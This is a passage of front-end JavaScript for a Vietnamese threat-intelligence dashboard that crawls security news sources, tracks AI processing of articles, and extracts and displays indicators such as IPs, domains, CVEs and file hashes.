    function buildTextFragmentUrl(baseUrl, rawToken) {
      if (!baseUrl) return '#';
      const base = baseUrl.split('#')[0];
      const tok = (rawToken || '').trim();
      if (!tok) return base;
      const prefix = tok.split(/\[\.\]|\(\.\)/)[0];
      if (prefix && prefix !== tok && prefix.length >= 3) {
        return `${base}#:~:text=${encodeURIComponent(tok)}&text=${encodeURIComponent(prefix)}`;
      }
      return `${base}#:~:text=${encodeURIComponent(tok)}`;
    }

    function switchMasterTab(tabId, btnEl) {
      document.querySelectorAll('.MasterTabPanel').forEach(p => p.style.display = 'none');
      document.querySelectorAll('.MasterTabBtn').forEach(b => {
        b.classList.remove('active');
        b.style.borderColor = 'var(--border-main)';
        b.style.background = '#ffffff';
      });
      const target = document.getElementById(tabId);
      if (target) target.style.display = 'block';
      if (btnEl) {
        btnEl.classList.add('active');
        if (tabId === 'tabSkillMaster') {
          btnEl.style.borderColor = '#0969da';
          btnEl.style.background = 'var(--primary-subtle)';
        } else if (tabId === 'tabAuditMaster') {
          btnEl.style.borderColor = '#1a7f37';
          btnEl.style.background = '#dafbe1';
        } else {
          btnEl.style.borderColor = '#0969da';
          btnEl.style.background = 'var(--primary-subtle)';
        }
      }
    }

    function switchEngineSubTab(subId, btnEl) {
      document.querySelectorAll('.EngineSubPanel').forEach(p => p.style.display = 'none');
      document.querySelectorAll('.EngineSubBtn').forEach(b => {
        b.classList.remove('active', 'btn-primary');
      });
      const target = document.getElementById(subId);
      if (target) target.style.display = 'block';
      if (btnEl) {
        btnEl.classList.add('active', 'btn-primary');
      }
      if (subId === 'subTabLiveServer') {
        fetchLiveDefenseStatus();
      }
    }

    function openTab(tabId, btnEl) {
      const subMapping = {
        'tabWaf': 'subTabWaf',
        'tabSuricata': 'subTabSuricata',
        'tabFirewall': 'subTabFirewall',
        'tabSigma': 'subTabSigma',
        'tabYara': 'subTabYara',
        'tabHistory': 'subTabHistory',
        'tabLiveServer': 'subTabLiveServer'
      };
      if (subMapping[tabId]) {
        switchMasterTab('tabEnginesMaster', document.getElementById('mainTabBtn_engines'));
        const subBtn = document.getElementById('subBtn_' + subMapping[tabId]);
        switchEngineSubTab(subMapping[tabId], subBtn);
        return;
      }
      if (tabId === 'tabSkillMd') {
        switchMasterTab('tabSkillMaster', document.getElementById('mainTabBtn_skill'));
        return;
      }
      if (tabId === 'tabTrustAudit' || tabId === 'tabXAI') {
        switchMasterTab('tabAuditMaster', document.getElementById('mainTabBtn_audit'));
        return;
      }
      document.querySelectorAll('.TabPanel').forEach(p => p.classList.remove('active'));
      document.querySelectorAll('.DecoTabs .CleanBtn').forEach(b => b.classList.remove('active'));
      const el = document.getElementById(tabId);
      if (el) el.classList.add('active');
      if (btnEl) btnEl.classList.add('active');
    }

    let serverRemainingSec = 21600;
    let serverScanInterval = 21600;
    let isServerScanning = false;
    let isServerQueueRunning = false;
    let lastCompletedArticleCount = -1;

    async function syncWithServerDaemon() {
      try {
        const res = await fetch('/api/system/daemon-status');
        if (!res.ok) return;
        const d = await res.json();

        serverRemainingSec = d.remaining_scan_sec;
        serverScanInterval = d.scan_interval_sec || 21600;
        isServerScanning = d.is_scanning;
        isServerQueueRunning = d.is_processing_queue;

        const scanToggle = document.getElementById('autoScanToggle');
        if (scanToggle && scanToggle.checked !== d.auto_scan_enabled) {
          scanToggle.checked = d.auto_scan_enabled;
        }
        const delaySelect = document.getElementById('scanDelayInput');
        if (delaySelect && String(delaySelect.value) !== String(d.scan_interval_sec)) {
          delaySelect.value = String(d.scan_interval_sec);
        }
        const queueToggle = document.getElementById('autoQueueToggle');
        if (queueToggle && queueToggle.checked !== d.auto_queue_enabled) {
          queueToggle.checked = d.auto_queue_enabled;
          autoQueueEnabled = d.auto_queue_enabled;
        }
        const queueStatus = document.getElementById('queueWorkerStatus');
        if (queueStatus) {
          queueStatus.textContent = d.auto_queue_enabled ? 'Bật' : 'Tắt';
          queueStatus.style.color = d.auto_queue_enabled ? 'var(--primary)' : 'var(--text-muted)';
        }

        updateCountdownBadge();

        if (d.is_processing_queue && d.active_article_title) {
          updateLiveTicker(`[Server Tự Động 24/7] Đang xử lý: "${d.active_article_title.slice(0, 50)}..." • ${d.active_stage_name}`);
          const stText = document.getElementById('statusText');
          if (stText) stText.textContent = `Server AI đang xử lý: ${d.active_stage_name}...`;

          const stageIdx = d.active_stage_idx || 2;
          setStageState(stageIdx, 'active', '', '', stageIdx * 20);

          if (d.active_article_id) {
            const actIdx = articles.findIndex(a => a.article_id === d.active_article_id);
            if (actIdx !== -1) {
              articles[actIdx].status = 'processing';
              const cardEl = document.getElementById(`ncard-${actIdx}`);
              if (cardEl) {
                const badgeEl = cardEl.querySelector('.BadgePending, .BadgeCompleted, .BadgeProcessing');
                if (badgeEl) {
                  badgeEl.className = 'BadgeProcessing';
                  badgeEl.textContent = 'Đang xử lý...';
                }
              }
              if (selectedIndices.length === 0) {
                selectCard(actIdx, false);
              }
            }
          }
        }

        if (lastCompletedArticleCount !== -1 && d.completed_count !== lastCompletedArticleCount) {
          await loadArticles(currentFilter, false);
          setStageState(5, 'done', '', '', 100);
          updateLiveTicker(`[Server Tự Động 24/7] Hoàn tất 1 bài báo! Tổng tiến độ: ${d.completed_count}/${d.total_articles} bài (${Math.round((d.completed_count / d.total_articles) * 100)}%).`);
          const stText = document.getElementById('statusText');
          if (stText) stText.textContent = `Server AI: Đã xử lý ${d.completed_count}/${d.total_articles} bài báo. Sẵn sàng nhận lệnh mới.`;
        }
        lastCompletedArticleCount = d.completed_count;
      } catch (e) {
        console.warn("Lỗi sync daemon server:", e);
      }
    }

    async function onScanDelayChange(newVal) {
      const sec = parseInt(newVal, 10);
      serverScanInterval = sec;
      const wzCadence = document.getElementById('wzCadenceSelect');
      if (wzCadence && wzCadence.value !== String(sec)) wzCadence.value = String(sec);
      try {
        await fetch('/api/system/daemon-config', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ scan_interval_sec: sec }),
        });
      } catch (e) {}
      await syncWithServerDaemon();
    }

    async function onAutoScanToggleChange(checked) {
      try {
        await fetch('/api/system/daemon-config', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ auto_scan_enabled: checked }),
        });
      } catch (e) {}
      await syncWithServerDaemon();
    }

    async function onAutoQueueToggleChange(checked) {
      autoQueueEnabled = checked;
      try {
        await fetch('/api/system/daemon-config', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ auto_queue_enabled: checked }),
        });
      } catch (e) {}
      await syncWithServerDaemon();
    }

    function resetAutoScanTimer() {
      syncWithServerDaemon();
    }

    function updateCountdownBadge() {
      const badge = document.getElementById('countdownText');
      const pctBadge = document.getElementById('progressPercentText');
      const enabled = document.getElementById('autoScanToggle')?.checked ?? true;
      if (!badge) return;

      if (isServerScanning) {
        badge.textContent = "Đang quét...";
        if (pctBadge) pctBadge.textContent = "Quét...";
        return;
      }

      if (!enabled) {
        badge.textContent = "Tắt";
        if (pctBadge) pctBadge.textContent = "0%";
        return;
      }

      badge.textContent = `${Math.max(0, serverRemainingSec)}s`;
      if (pctBadge && serverScanInterval > 0) {
        const pct = Math.max(0, Math.min(100, Math.round((serverRemainingSec / serverScanInterval) * 100)));
        pctBadge.textContent = `${pct}%`;
      }
    }

    async function triggerAutoScanCrawl() {
      if (isServerScanning) return;
      try {
        updateLiveTicker("Crawler tự động: Yêu cầu server quét 6 nguồn OSINT...");
        await fetch('/api/system/trigger-scan', { method: 'POST' });
        await syncWithServerDaemon();
      } catch (e) {
      }
    }

    function startBackgroundCountdown() {
      if (timerInterval) clearInterval(timerInterval);
      syncWithServerDaemon();

      let tickCount = 0;
      timerInterval = setInterval(async () => {
        tickCount++;
        if (!isServerScanning && serverRemainingSec > 0) {
          serverRemainingSec--;
        }
        updateCountdownBadge();

        if (tickCount % 3 === 0 || serverRemainingSec <= 0) {
          await syncWithServerDaemon();
        }
      }, 1000);
    }

    async function filterBySource(src) {
      currentFilter = src;
      await loadArticles(src, false);
      if (autoQueueEnabled && !isQueueWorkerRunning) {
        triggerNextInQueue();
      }
    }

    async function loadArticles(sourceFilter = 'ALL', autoSelect = false) {
      try {
        const res = await fetch(`/api/articles?source=${encodeURIComponent(sourceFilter)}`);
        const newArticles = await res.json();

        articles = newArticles;
        allHistoryArticles = articles.slice();

        renderSourceWebsites();
        renderNewsGrid();
        renderHistoryManager();
        if (articles.length > 0 && (selectedIndices.length === 0 || !articles[selectedIndices[0]])) {
          const queueIdx = articles.findIndex(a => (a.status || 'pending') === 'processing');
          const pendingIdx = articles.findIndex(a => (a.status || 'pending') === 'pending');
          const pickIdx = queueIdx !== -1 ? queueIdx : (pendingIdx !== -1 ? pendingIdx : 0);
          selectCard(pickIdx, false);
        }
      } catch (err) {
        console.error("Lỗi nạp bài báo:", err);
      }
    }

    function setHistorySort(mode, btnEl) {
      historySortMode = mode;
      ['btnSortRecentDone', 'btnSortNewest', 'btnSortOldest', 'btnSortIoc'].forEach(id => {
        const el = document.getElementById(id);
        if (el) el.classList.remove('active');
      });
      if (btnEl) btnEl.classList.add('active');
      renderHistoryManager();
    }

    function renderHistoryManager() {
      let list = [];
      if (historyViewMode === 'PROJECT') {
        list = articles.slice();
      } else {
        list = (globalArchiveArticles && globalArchiveArticles.length > 0) ? globalArchiveArticles.slice() : articles.slice();
      }
      // 1. Tính toán 4 ô thống kê tổng quan
      const completedArticles = list.filter(a => a.status === 'completed');
      const completedCount = completedArticles.length;
      const processingArticles = list.filter(a => a.status === 'processing');
      const processingCount = processingArticles.length;
      const pendingArticles = list.filter(a => (a.status || 'pending') === 'pending');
      const pendingCount = pendingArticles.length;

      const navCount = document.getElementById('navHistoryCount');
      if (navCount) navCount.textContent = completedCount;

      let compIps = 0, compDoms = 0, compCves = 0, compShas = 0;
      completedArticles.forEach(a => {
        const c = a.ioc_counts || {};
        compIps += (c.ips || 0);
        compDoms += (c.domains || 0);
        compCves += (c.cves || 0);
        compShas += (c.sha256 || 0);
      });
      const compTotalIocs = compIps + compDoms + compCves + compShas;

      const chrono = list.slice().sort((a, b) => (a.sort_ts || '').localeCompare(b.sort_ts || ''));
      const oldestDate = chrono.length > 0 ? (chrono[0].sort_ts || '').slice(0, 10) : '--';
      const newestDate = chrono.length > 0 ? (chrono[chrono.length - 1].sort_ts || '').slice(0, 10) : '--';

      const elTotal = document.getElementById('statTotalArticles');
      const elRange = document.getElementById('statDateRange');
      const elOldNew = document.getElementById('statOldVsNew');
      const elIocs = document.getElementById('statTotalIocs');
      const elIocSub = document.getElementById('statIocBreakdown');

      if (elTotal) elTotal.textContent = `${list.length} bài thu thập`;
      if (elRange) elRange.textContent = `${oldestDate} đến ${newestDate}`;
      if (elOldNew) {
        elOldNew.innerHTML = `<span style="color:var(--safe); font-weight:700;">${completedCount} Đã học</span> • <span style="color:var(--text-muted);">${pendingCount} Chờ xử lý</span>${processingCount > 0 ? ` • <span style="color:var(--primary); font-weight:600;">${processingCount} Đang chạy</span>` : ''}`;
      }
      if (elIocs) elIocs.textContent = `${compTotalIocs} chỉ số đã học`;
      if (elIocSub) elIocSub.textContent = `${compIps} IP • ${compDoms} Domain • ${compCves} CVE • ${compShas} Hash (từ ${completedCount}/${list.length} bài)`;

      // 2. Lọc theo Trạng thái, Nguồn, Phân hệ Scope, Từ khóa
      const statusFilter = (document.getElementById('historyStatusFilter')?.value) || 'COMPLETED';
      const srcFilter = (document.getElementById('historySourceFilter')?.value) || 'ALL';
      const scopeFilter = (document.getElementById('historyScopeFilter')?.value) || 'ALL';
      const kw = ((document.getElementById('historySearchInput')?.value) || '').trim().toLowerCase();

      const scopeKeywordsMap = {
        'SCOPE_WEB': ['web', 'php', 'node', 'javascript', 'sql', 'rce', 'api', 'xss', 'magento', 'wordpress', 'express', 'laravel'],
        'SCOPE_NETWORK': ['network', 'c2', 'botnet', 'mirai', 'dns', 'router', 'traffic', 'ddos', 'firewall', 'packet'],
        'SCOPE_ENDPOINT': ['endpoint', 'windows', 'sysmon', 'edr', 'applocker', 'ransomware', 'mimikatz', 'trojan', 'malware'],
        'SCOPE_HARDWARE': ['firmware', 'uefi', 'bios', 'iot', 'hardware', 'scada', 'ics', 'ot']
      };

      // Đánh số thứ tự gốc từ Cũ Nhất (#01) -> Mới Nhất (#N) để hiển thị rõ tiến trình học
      const chronologicalOrderMap = {};
      chrono.forEach((a, idx) => {
        chronologicalOrderMap[a.article_id] = idx + 1;
      });

      let filtered = list.filter(a => {
        const isDone = (a.status === 'completed');
        if (statusFilter === 'COMPLETED' && !isDone) return false;
        if (statusFilter === 'PENDING' && isDone) return false;
        if (statusFilter === 'HAS_IOC' && ((a.ioc_counts?.total || 0) === 0)) return false;
        if (statusFilter === 'HAS_HASH' && ((a.ioc_counts?.sha256 || 0) === 0)) return false;
        if (statusFilter === 'HAS_IP' && ((a.ioc_counts?.ips || 0) === 0)) return false;
        if (statusFilter === 'HAS_CVE' && ((a.ioc_counts?.cves || 0) === 0)) return false;
        if (srcFilter !== 'ALL' && !a.source.toLowerCase().includes(srcFilter.toLowerCase())) return false;
        if (scopeFilter !== 'ALL' && scopeKeywordsMap[scopeFilter]) {
          const contentHay = `${a.title} ${a.content || ''}`.toLowerCase();
          const matchesScope = scopeKeywordsMap[scopeFilter].some(sk => contentHay.includes(sk));
          if (!matchesScope) return false;
        }
        if (kw) {
          const hay = `${a.title} ${a.source} ${a.published_at} ${a.content}`.toLowerCase();
          if (!hay.includes(kw)) return false;
        }
        return true;
      });

      // 3. Sắp xếp theo chế độ đang chọn
      if (historySortMode === 'RECENT_DONE') {
        filtered.sort((a, b) => {
          const timeA = a.last_analyzed_at || '';
          const timeB = b.last_analyzed_at || '';
          if (timeA && timeB) return timeB.localeCompare(timeA);
          if (timeA && !timeB) return -1;
          if (!timeA && timeB) return 1;
          return (b.sort_ts || '').localeCompare(a.sort_ts || '');
        });
      } else if (historySortMode === 'OLDEST') {
        filtered.sort((a, b) => (a.sort_ts || '').localeCompare(b.sort_ts || ''));
      } else if (historySortMode === 'NEWEST') {
        filtered.sort((a, b) => (b.sort_ts || '').localeCompare(a.sort_ts || ''));
      } else if (historySortMode === 'IOC_DESC') {
        filtered.sort((a, b) => ((b.ioc_counts?.total || 0) - (a.ioc_counts?.total || 0)) || (a.sort_ts || '').localeCompare(b.sort_ts || ''));
      }

      const selCountEl = document.getElementById('histSelectedCount');
      if (selCountEl) selCountEl.textContent = selectedHistoryIds.size;

      const tbody = document.getElementById('historyTableBody');
      if (!tbody) return;
      if (filtered.length === 0) {
        tbody.innerHTML = `<tr><td colspan="6" style="color:var(--text-muted); text-align:center; padding:18px;">Không tìm thấy bài báo nào khớp bộ lọc.</td></tr>`;
        return;
      }

      const MAX_RENDER = 100;
      const toShow = filtered.slice(0, MAX_RENDER);
      const moreCount = filtered.length - MAX_RENDER;
      const moreNotice = moreCount > 0
        ? `<tr><td colspan="6" style="padding:14px; text-align:center; background:var(--bg-subtle); color:var(--text-muted); font-size:12px;">
            Đang hiển thị 100 bài tiêu biểu nhất trên tổng số <b>${filtered.length.toLocaleString()}</b> bài trong kho SQLite. Dùng thanh tìm kiếm hoặc bộ lọc để tra cứu tức thì bất kỳ bài nào!
          </td></tr>`
        : '';

      tbody.innerHTML = toShow.map(art => {
        const seqNum = String(chronologicalOrderMap[art.article_id] || 1).padStart(2, '0');
        const checked = selectedHistoryIds.has(art.article_id) ? 'checked' : '';
        const pubDateStr = formatToLocalTime(art.sort_ts || art.published_at);
        const fetchedDateStr = formatToLocalTime(art.fetched_at || art.sort_ts);
        const isDone = (art.status === 'completed');
        const durStr = art.processing_time_sec ? ` (${art.processing_time_sec.toFixed(1)}s)` : '';
        const analyzedStr = art.last_analyzed_at ? `<div style="font-size:11px; color:var(--safe); font-family:var(--font-mono); margin-top:2px;">Xong: ${formatTimeOnly(art.last_analyzed_at)}</div>` : '';
        const statusBadge = isDone
          ? `<span class="BadgeCompleted">Hoàn thành${durStr}</span>${analyzedStr}`
          : (art.status === 'processing'
            ? `<span class="BadgeProcessing">Đang xử lý...</span>`
            : `<span class="BadgePending">Chờ xử lý</span>`);

        const c = art.ioc_counts || {};
        const chips = [];
        (c.sample_shas || []).forEach(sh => chips.push(`<span class="IocChip hash">SHA: ${sh.slice(0, 8)}...</span>`));
        (c.sample_ips || []).forEach(ip => {
          const clean = (ip || '').replace(/\[\.\]/g, '.').replace(/\(\.\)/g, '.').trim();
          if (clean.startsWith('127.') || clean.startsWith('0.') || clean.startsWith('169.254.') || clean === '255.255.255.255') {
            return;
          }
          if (clean.startsWith('10.') || clean.startsWith('192.168.') || /^172\.(1[6-9]|2\d|3[0-1])\./.test(clean)) {
            chips.push(`<span class="IocChip ip-internal" title="Địa chỉ IP nội bộ mạng LAN (RFC1918)">LAN: ${ip}</span>`);
          } else if (['8.8.8.8', '8.8.4.4', '1.1.1.1', '1.0.0.1'].includes(clean)) {
            chips.push(`<span class="IocChip ip-safe" title="Public DNS an toàn">DNS: ${ip}</span>`);
          } else {
            chips.push(`<span class="IocChip ip" title="C2 / IP ngoại mạng">IP: ${ip}</span>`);
          }
        });
        (c.sample_cves || []).forEach(cv => chips.push(`<span class="IocChip cve">${cv}</span>`));
        (c.sample_domains || []).forEach(dm => chips.push(`<span class="IocChip dom">${dm}</span>`));

        const summaryCounts = [];
        if (c.ips > 0) summaryCounts.push(`<b>${c.ips}</b> IP`);
        if (c.domains > 0) summaryCounts.push(`<b>${c.domains}</b> Domain`);
        if (c.cves > 0) summaryCounts.push(`<b>${c.cves}</b> CVE`);
        if (c.sha256 > 0) summaryCounts.push(`<b>${c.sha256}</b> Hash`);

        const iocCellHtml = summaryCounts.length > 0
          ? `<div style="font-size:11.5px; margin-bottom:4px; color:var(--primary);">${summaryCounts.join(' &bull; ')}</div><div>${chips.slice(0, 4).join('')}</div>`
          : `<span style="color:var(--text-muted); font-size:12px;">Báo cáo ngữ cảnh chung</span>`;

        const safeTitle = (art.title || '').replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
        const charLen = (art.content || '').length.toLocaleString('vi-VN');

        return `
          <tr>
            <td class="mono">
              <label style="cursor:pointer; display:flex; align-items:center; gap:6px;">
                <input type="checkbox" ${checked} onchange="toggleHistoryCheckbox('${art.article_id}', this.checked)" />
                <b style="color:var(--primary);">#${seqNum}</b>
              </label>
            </td>
            <td>
              <div class="mono" style="font-size:11.5px; color:var(--text-main); margin-bottom:2px;" title="Ngày xuất bản bài báo gốc">
                <span style="color:var(--text-muted);">Đăng:</span> ${pubDateStr || '--'}
              </div>
              <div class="mono" style="font-size:11px; color:var(--primary); margin-bottom:5px;" title="Thời điểm crawler quét và nạp vào hệ thống">
                <span style="color:var(--text-muted);">Quét:</span> ${fetchedDateStr || '--'}
              </div>
              ${statusBadge}
            </td>
            <td>
              <div style="font-weight:600; color:var(--text-main); margin-bottom:4px;">${art.source}</div>
              <a class="BtnMiniProof" href="${art.url}" target="_blank">Báo gốc &nearr;</a>
            </td>
            <td>
              <div style="font-weight:600; color:var(--text-main); cursor:pointer; line-height:1.4;" onclick="viewArticleById('${art.article_id}', false)" title="Nhấn để đọc văn bản nguyên bản">
                ${safeTitle}
              </div>
              <div style="font-size:11.5px; color:var(--text-muted); margin-top:3px;">
                Độ dài: ${charLen} ký tự &bull; Mã: <span class="mono">${art.article_id}</span>
              </div>
            </td>
            <td>${iocCellHtml}</td>
            <td>
              <div style="display:flex; gap:5px; flex-wrap:wrap;">
                <button class="BtnMiniProof" onclick="viewArticleById('${art.article_id}', false)">Xem</button>
                <button class="BtnMiniProof" style="border-color:var(--primary); color:var(--primary);" onclick="viewArticleById('${art.article_id}', true)">Chạy AI</button>
                <button class="BtnMiniProof" style="border-color:var(--danger-border); color:var(--danger);" onclick="deleteArticleFromHistory('${art.article_id}')">Xóa</button>
              </div>
            </td>
          </tr>
        `;
      }).join('') + moreNotice;
    }

    function toggleHistoryCheckbox(articleId, isChecked) {
      if (isChecked) {
        selectedHistoryIds.add(articleId);
      } else {
        selectedHistoryIds.delete(articleId);
      }
      const selCountEl = document.getElementById('histSelectedCount');
      if (selCountEl) selCountEl.textContent = selectedHistoryIds.size;
    }

    function toggleSelectAllHistory(isChecked) {
      const list = (allHistoryArticles && allHistoryArticles.length > 0) ? allHistoryArticles : articles;
      if (isChecked) {
        list.forEach(a => selectedHistoryIds.add(a.article_id));
      } else {
        selectedHistoryIds.clear();
      }
      renderHistoryManager();
    }

    function viewArticleById(articleId, autoRunAi = false) {
      const list = (allHistoryArticles && allHistoryArticles.length > 0) ? allHistoryArticles : articles;
      const foundIdx = articles.findIndex(a => a.article_id === articleId);
      if (foundIdx >= 0) {
        selectCard(foundIdx, autoRunAi);
      } else {
        const foundArt = list.find(a => a.article_id === articleId);
        if (!foundArt) return;
        articles.unshift(foundArt);
        renderNewsGrid();
        selectCard(0, autoRunAi);
      }
      const viewer = document.getElementById('sec-feed');
      if (viewer && viewer.style.display !== 'none') {
        viewer.scrollIntoView({ behavior: 'smooth', block: 'start' });
      } else {
        switchView('all', document.querySelector('.NavLinks .NavLink'));
        setTimeout(() => {
          document.getElementById('sec-feed')?.scrollIntoView({ behavior: 'smooth', block: 'start' });
        }, 100);
      }
    }

    function analyzeSelectedHistoryArticles() {
      const list = (allHistoryArticles && allHistoryArticles.length > 0) ? allHistoryArticles : articles;
      const chosen = list.filter(a => selectedHistoryIds.has(a.article_id));
      if (chosen.length === 0) {
        alert("Vui lòng tích chọn ít nhất 1 bài báo trong bảng Lịch Sử để chạy phân tích!");
        return;
      }
      currentTitle = `[Gộp ${chosen.length} Bài Từ Lịch Sử] ` + chosen.map(a => a.source).join(', ');
      document.getElementById('articleText').value = chosen.map((a, i) =>
        `=== [BÀI BÁO LỊCH SỬ #${i + 1} - ${a.source} (${a.published_at})]: ${a.title} ===\n${a.content}`
      ).join('\n\n');
      renderHighlightedArticlesAndBuildProvenance(chosen.map((art, idx) => ({ art, idx })));
      switchView('all', document.querySelector('.NavLinks .NavLink'));
      document.getElementById('sec-score')?.scrollIntoView({ behavior: 'smooth', block: 'start' });
      runPipeline();
    }

    async function toggleArticleHistoricalStatus(articleId) {
      try {
        const res = await fetch('/api/articles/toggle-status', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ article_id: articleId })
        });
        const data = await res.json();
        allHistoryArticles = data.articles || [];
        articles = allHistoryArticles.slice();
        renderNewsGrid();
        renderHistoryManager();
      } catch (e) {
        alert("Lỗi đổi trạng thái: " + e);
      }
    }

    async function deleteArticleFromHistory(articleId) {
      try {
        const res = await fetch('/api/articles/delete', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ article_id: articleId })
        });
        const data = await res.json();
        selectedHistoryIds.delete(articleId);
        allHistoryArticles = data.articles || [];
        articles = allHistoryArticles.slice();
        renderNewsGrid();
        renderHistoryManager();
      } catch (e) {
        alert("Lỗi xóa bài báo: " + e);
      }
    }

    
    async function resetAllArticlesToPending(btnEl) {
      if (!confirm("Bạn có chắc chắn muốn đặt lại TOÀN BỘ bài báo về trạng thái Chờ Xử Lý (pending) để Tác tử AI phân tích lại từ đầu không?")) return;
      if (btnEl) { btnEl.disabled = true; btnEl.textContent = "Đang đặt lại..."; }
      try {
        const res = await fetch('/api/articles/reset-all-status', { method: 'POST' });
        const data = await res.json();
        if (data.status === 'success') {
          allHistoryArticles = data.articles || [];
          articles = allHistoryArticles.slice();
          renderNewsGrid();
          renderHistoryManager();
        } else {
          alert("Lỗi: " + data.message);
        }
      } catch (e) {
        alert("Lỗi kết nối: " + e);
      } finally {
        if (btnEl) { btnEl.disabled = false; btnEl.textContent = "[ Đặt Lại Toàn Bộ Về Chờ Xử Lý ]"; }
      }
    }

    async function triggerManualRefreshHistory(btnEl) {
      if (btnEl) {
        btnEl.disabled = true;
        btnEl.textContent = "Đang quét 6 nguồn...";
      }
      updateLiveTicker("Crawler: Đang tự động quét 6 nguồn OSINT quốc tế (TheHackerNews, CISA KEV, Securelist...)...");
      try {
        await fetch('/api/articles/refresh', { method: 'POST' });
        await loadArticles(currentFilter, false);
        updateLiveTicker("Crawler: Đã hoàn tất quét và đồng bộ dữ liệu mới vào kho tri thức SQLite.");
      } finally {
        if (btnEl) {
          btnEl.disabled = false;
          btnEl.textContent = "Quét Thêm Báo";
        }
      }
    }

    async function triggerCrawlYtd(btnEl) {
      if (btnEl) {
        btnEl.disabled = true;
        btnEl.textContent = "Đang quét dữ liệu 2026...";
      }
      updateLiveTicker("YTD Crawler: Đang quét toàn diện các nguồn OSINT quốc tế từ đầu năm 2026 (TheHackerNews, CISA KEV, Securelist, SentinelOne, DFIR Report)...");
      try {
        const res = await fetch('/api/articles/crawl-ytd?since=2026-01-01', { method: 'POST' });
        const result = await res.json();
        await loadArticles(currentFilter, false);
        const addedCount = result.collected_in_batch || 0;
        const totalCount = result.total_articles_in_db || 0;
        updateLiveTicker(`YTD Crawler: Hoàn tất quét. Đã nạp ${addedCount} bài từ năm 2026. Tổng kho tri thức hiện có: ${totalCount} bài.`);
      } catch (e) {
        alert("Lỗi quét dữ liệu 2026: " + e);
        updateLiveTicker("YTD Crawler: Gặp sự cố kết nối khi quét bổ sung dữ liệu.");
      } finally {
        if (btnEl) {
          btnEl.disabled = false;
          btnEl.textContent = "Quét Bổ Sung Dữ Liệu 2026";
        }
      }
    }

    function updateLiveTicker(msg) {
      const el = document.getElementById('liveTickerText');
      const timeEl = document.getElementById('liveTickerTime');
      if (el) el.textContent = msg;
      if (timeEl) {
        const now = new Date();
        timeEl.textContent = now.toTimeString().slice(0, 8);
      }
    }

    function renderNewsGrid() {
      const grid = document.getElementById('newsGrid');
      const statusFilterVal = (document.getElementById('feedStatusFilter')?.value) || 'QUEUE';
      let displayedArticles = articles.slice();
      if (statusFilterVal === 'QUEUE') {
        displayedArticles = displayedArticles.filter(a => {
          const st = a.status || 'pending';
          return st === 'pending' || st === 'processing';
        });
      } else if (statusFilterVal !== 'ALL') {
        displayedArticles = displayedArticles.filter(a => (a.status || 'pending') === statusFilterVal);
      }
      if (displayedArticles.length === 0) {
        grid.innerHTML = `<div style="padding:22px; text-align:center; color:var(--text-muted); font-size:13px; line-height:1.6;">
          <div style="font-weight:600; color:var(--primary); margin-bottom:6px;">HÀNG ĐỢI LIVE TRỐNG</div>
          Tất cả bài báo trong đợt quét đã được xử lý xong và lưu trữ trong mục <b>Lịch Sử</b> bên dưới.
        </div>`;
        return;
      }
      const MAX_FEED = 50;
      const feedToShow = displayedArticles.slice(0, MAX_FEED);
      grid.innerHTML = feedToShow.map((art) => {
        const idx = articles.indexOf(art);
        const isSel = selectedIndices.includes(idx) ? 'selected' : '';
        const counts = art.ioc_counts || { ips: 0, domains: 0, cves: 0, sha256: 0, total: 0 };
        const badgeParts = [];
        if (counts.ips > 0) badgeParts.push(`${counts.ips} IP`);
        if (counts.domains > 0) badgeParts.push(`${counts.domains} Domain`);
        if (counts.cves > 0) badgeParts.push(`${counts.cves} CVE`);
        if (counts.sha256 > 0) badgeParts.push(`${counts.sha256} Hash`);
        const iocBadge = badgeParts.length > 0 ? badgeParts.join(' · ') : 'CTI';

        const st = art.status || 'pending';
        let statusBadgeHtml = '';
        if (st === 'processing') {
          statusBadgeHtml = `<span class="BadgeProcessing">Đang xử lý...</span>`;
        } else if (st === 'completed') {
          const dur = art.processing_time_sec ? `${art.processing_time_sec.toFixed(1)}s` : 'Xong';
          statusBadgeHtml = `<span class="BadgeCompleted">Đã xử lý (${dur})</span>`;
        } else {
          statusBadgeHtml = `<span class="BadgePending">Chờ xử lý</span>`;
        }

        const pubDateStr = formatToLocalTime(art.sort_ts || art.published_at);
        const fetchedDateStr = formatToLocalTime(art.fetched_at || art.sort_ts);

        return `
          <div class="FeedItem ${isSel}" id="ncard-${idx}" onclick="selectCard(${idx}, false)">
            <div class="FeedMeta">
              <span class="FeedSource">#${idx + 1} &bull; ${art.source}</span>
              <span>${iocBadge}</span>
            </div>
            <div class="FeedTitle">${art.title}</div>
            <div class="FeedFootMeta" style="flex-wrap: wrap; gap: 4px;">
              <span title="Thời gian xuất bản gốc (Giờ Việt Nam GMT+7)"><span style="color:var(--text-muted);">Đăng:</span> <span class="mono">${pubDateStr || '--'}</span></span>
              <span title="Thời điểm crawler quét nạp về hệ thống (Giờ Việt Nam GMT+7)"><span style="color:var(--text-muted);">Quét:</span> <span class="mono" style="color:var(--primary);">${fetchedDateStr || '--'}</span></span>
              <div style="margin-left: auto;">${statusBadgeHtml}</div>
            </div>
          </div>
        `;
      }).join('');
    }

    function renderHighlightedArticlesAndBuildProvenance(selectedArts) {
      iocProvenanceMap = {};
      const ipRegex = /\b(?:(?:25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)(?:\[\.\]|\(\.\)|\.)){3}(?:25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)\b/g;
      const domRegex = /\b(?:[a-zA-Z0-9-]+\.)*[a-zA-Z0-9-]+(?:\[\.\]|\(\.\))(?:com|net|org|io|ru|cn|xyz|top|info|biz|cc|pw|club|online|site|tech|gov|edu|tw|ua|pl|ro|ca|uk|ae|la|bet|wiki)\b/gi;
      const cveRegex = /\bCVE-\d{4}-\d{4,7}\b/gi;
      const shaRegex = /\b[a-fA-F0-9]{64}\b/g;

      const htmlBlocks = selectedArts.map(({ art, idx }) => {
        const rawIps = [];
        let ipMatch;
        ipRegex.lastIndex = 0;
        while ((ipMatch = ipRegex.exec(art.content)) !== null) {
          if (isValidIpv4Token(ipMatch[0], art.content, ipMatch.index)) {
            rawIps.push(ipMatch[0]);
          }
        }
        rawIps.forEach(rawIp => {
